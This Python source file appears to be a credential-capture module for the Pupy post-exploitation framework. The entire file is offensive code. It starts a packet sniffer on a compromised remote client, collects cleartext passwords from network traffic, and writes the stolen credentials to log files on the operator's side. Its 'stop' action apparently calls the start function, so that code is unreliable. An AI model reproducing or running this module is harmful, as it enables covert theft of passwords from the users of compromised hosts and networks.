# -*- coding: utf-8 -*-
# Thanks to Dan McInerney for its net-creds project
# Github: https://github.com/DanMcInerney/net-creds

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
from pupy.pupylib.PupyModule import (
    config, PupyModule, PupyArgumentParser,
    QA_DANGEROUS
)
import os
import datetime

from io import open

__class_name__="Credcap"

@config(cat="gather", compat=["linux", "windows"])
class Credcap(PupyModule):
    """
        Sniffs cleartext passwords from interface
    """
    unique_instance = True
    dependencies=['netifaces', 'gzip', 'BaseHTTPServer', 'pupyutils.netcreds']
    qa = QA_DANGEROUS

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='credcap', description=cls.__doc__)
        cls.arg_parser.add_argument("-i", metavar="INTERFACE", dest='interface', default=None, help="Choose an interface (optional)")
        cls.arg_parser.add_argument("-f", metavar="IP", dest='filterip', default=None, help="Do not sniff packets from this IP address; -f 192.168.0.4")
        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def run(self, args):
        if args.action=="start":

            # Load full scapy
            self.client.load_package('scapy', honor_ignore=False, force=True)
            credcap_start = self.client.remote('pupyutils.netcreds', 'credcap_start', False)

            r = credcap_start(args.interface, args.filterip)
            if r == 'not_root':
                self.error("Needs root privileges to be started")
            elif not r:
                self.error("Network credentials sniffer is already started")
            else:
                self.success("Network credentials sniffer started !")

        elif args.action=="dump":
            try:
                os.makedirs(os.path.join("data","credcap"))
            except Exception:
                pass

            credcap_dump = self.client.remote('pupyutils.netcreds', 'credcap_dump')
            data = credcap_dump()

            if data is None:
                self.error("Network credentials sniffer has not been started yet")

            elif not data:
                self.warning("No network credentials recorded")

            else:
                data = '\n'.join(data)
                data += '\n'

                # remove color before writting into the file
                W = '\033[0m'  # white (normal)
                T = '\033[93m'  # tan
                data_no_color=data.replace(W, '').replace(T, '')
                filepath=os.path.join("data", "credcap","creds_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".log")
                self.success("Dumping recorded credcap in %s"%filepath)
                with open(filepath, 'w') as f:
                    f.write(data_no_color)

                self.log(data)

        elif args.action=="stop":
            credcap_stop = self.client.remote('pupyutils.netcreds', 'credcap_start')
            credcap_stop()
            self.success("Network credentials sniffer is stopped")
